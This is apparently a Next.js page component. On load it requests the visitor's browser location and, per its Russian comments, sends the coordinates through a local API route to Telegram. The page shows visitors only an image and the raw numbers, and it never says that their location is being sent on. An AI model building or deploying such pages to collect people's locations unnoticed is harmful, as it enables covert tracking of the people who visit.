"use client";

import Image from "next/image";
import { useEffect, useState } from "react";

export default function Home() {
  const [location, setLocation] = useState<{ lat: number; lon: number } | null>(
    null
  );
  useEffect(() => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          setLocation({ lat, lon });

          // отправляем координаты в наш API
          try {
            const res = await fetch("/api/sendMessage", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ lat, lon }),
            });

            const data = await res.json();
            if (data.ok) {
              console.log("✅ Геолокация успешно отправлена в Telegram");
            } else {
              console.error("❌ Ошибка при отправке:", data.error);
            }
          } catch (error) {
            console.error("Ошибка отправки в Telegram:", error);
          }
        },
        (error) => {
          console.error("Ошибка получения геолокации:", error);
        }
      );
    } else {
      console.log("Геолокация не поддерживается браузером");
    }
  }, []);

  const handleSubmit = async () => {
    const lat = 0;
    const lon = 5;
    try {
      const res = await fetch("/api/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ lat, lon }),
      });

      const data = await res.json();
      if (data.ok) {
        console.log("✅ Геолокация успешно отправлена в Telegram");
      } else {
        console.error("❌ Ошибка при отправке:", data.error);
      }
    } catch (error) {
      console.error("Ошибка отправки в Telegram:", error);
    }
  };
  return (
    <div className="">
      <Image src={"/1.jpg"} width={500} height={500} alt="map" />
      <div className="">{location?.lat}</div>
      <div className="">{location?.lon}</div>
      <button className="text-white" onClick={() => handleSubmit()}>
        Send Test
      </button>
    </div>
  );
}
